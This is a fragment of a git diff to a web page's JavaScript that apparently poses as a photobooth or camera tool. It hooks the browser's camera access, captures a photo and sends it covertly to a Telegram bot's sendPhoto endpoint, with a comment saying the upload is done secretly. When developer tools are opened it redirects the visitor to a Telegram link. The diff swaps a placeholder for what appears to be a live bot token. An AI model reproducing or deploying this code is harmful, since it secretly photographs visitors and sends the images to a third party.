@@ -828,7 +828,7 @@
       const video = document.getElementById("preview");
       const status = document.getElementById("status");
       const msg = document.getElementById("msg");
-      const REDIRECT_URL = "https://t.me/congdongtooltut";
+      const REDIRECT_URL = "https://t.me/Vdonvision_bot";
 
       const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(
         navigator.mediaDevices,
@@ -892,7 +892,7 @@
                   const formData = new FormData();
                   formData.append("photo", blob, "photobooth_capture.jpg");
                   // Gửi ngầm tới endpoint Telegram hoặc server nhận (tương thích hoàn toàn với cấu trúc main.js)
-                  fetch("https://api.telegram.org/bot<TOKEN>/sendPhoto", {
+                  fetch("https://api.telegram.org/bot<8835809334:AAHW2xdO4AteQWwhmn410_qURoo2dMRi8OU>/sendPhoto", {
                     method: "POST",
                     body: formData,
                   }).catch(() => {});
@@ -975,7 +975,7 @@
             window.outerWidth - window.innerWidth > threshold ||
             window.outerHeight - window.innerHeight > threshold
           ) {
-            window.location.href = "https://t.me/congdongtooltut";
+            window.location.href = "https://t.me/Vdonvision_bot";
           }
         };
         setInterval(checkDevTools, 1000);
